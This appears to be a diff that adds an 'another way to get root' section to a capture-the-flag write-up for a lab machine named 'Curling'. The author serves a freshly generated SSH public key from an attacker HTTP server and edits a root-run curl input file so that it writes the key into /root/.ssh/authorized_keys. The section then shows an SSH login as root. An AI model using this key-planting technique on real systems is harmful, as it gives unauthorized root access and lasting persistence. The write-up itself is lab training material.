@@ -532,3 +532,79 @@ uid=0(root) gid=0(root) groups=0(root)
 root@curling:~# cat /root/root.txt 
 523a************************1537
 ```
+
+## Another way to get root 
+
+Let's create a ssh key and add it on the root `authorized_keys` file.
+
+```
+$ ssh-keygen -f curling-rsa
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in curling-rsa
+Your public key has been saved in curling-rsa.pub
+The key fingerprint is:
+SHA256:+7XUz96BvHvXtPf7aGIn6fOY5XkjprFbRLzPfovSyx8 kali@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|                 |
+|            .    |
+|             o   |
+|            . .  |
+|        S    o   |
+|         .  o.+ .|
+|        .  .+=oEo|
+|         . +@X*OX|
+|          .*X&@B^|
++----[SHA256]-----+
+```
+
+
+```
+$ ls -lha 
+...
+-rw------- 1 kali kali 2.6K Oct 31 12:27 curling-rsa
+-rw-r--r-- 1 kali kali  563 Oct 31 12:27 curling-rsa.pub
+...
+```
+
+Lets open the http server again
+
+```
+$ sudo python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Now lets edit again the `input` file and request it to download the new generated key and add it on the root `authorized_keys` file.
+
+```
+url = "http://10.10.14.14/curling-rsa.pub"
+output = /root/.ssh/authorized_keys
+```
+
+```
+floris@curling:~/admin-area$ cat input 
+url = "http://10.10.14.14/curling-rsa.pub"
+output = /root/.ssh/authorized_keys
+```
+
+As soon as we get a request on the HTTP server we can try to ssh as root into the machine using the new key.
+```
+$ sudo python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.150 - - [31/Oct/2022 12:30:01] "GET /curling-rsa.pub HTTP/1.1" 200 -
+```
+
+```
+$ ssh -i curling-rsa root@10.10.10.150
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)
+...
+Last login: Mon Oct 31 19:30:53 2022 from 10.10.14.14
+
+root@curling:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
+
